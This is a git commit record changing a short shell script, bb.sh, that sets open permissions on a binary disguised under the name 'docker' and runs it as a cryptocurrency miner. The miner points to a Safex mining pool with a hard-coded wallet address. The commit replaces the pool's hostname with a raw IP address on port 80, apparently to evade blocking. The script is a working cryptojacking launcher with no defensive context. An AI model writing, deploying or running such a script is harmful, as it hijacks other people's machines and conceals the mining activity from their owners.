13ded2b8b59cfc99be2bea420285344c7befe9df
jsiqiisn <jsiqiisn@outlook.com>
2022-03-23 08:20:43 +0000

    Update bb.sh

--- bb.sh
+++ bb.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 chmod 777 docker
-./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx
+./docker -o 40.83.177.217:80 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx
